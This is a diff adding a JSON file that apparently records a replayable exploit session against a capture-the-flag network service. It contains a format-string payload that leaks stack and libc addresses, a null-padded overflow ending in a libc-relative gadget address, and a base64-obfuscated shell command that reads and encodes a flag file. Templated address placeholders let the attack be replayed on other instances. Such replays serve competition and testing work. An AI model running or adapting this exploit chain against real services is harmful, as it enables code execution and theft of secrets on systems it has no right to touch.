@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-11984:12:HEX:18:0x7fff27b71130}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7f4cf161d780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7f4cf134e2c0}}}:0x7f4cf1844700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7f4cf1348147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnIHxiYXNlNjQK{{{HEAP_BASE:131106:3:ORI:50:0x7c2022}}}base64 -{{{HEAP_BASE:131172:3:ORI:61:0x7c2064}}}sh\\n"
+]
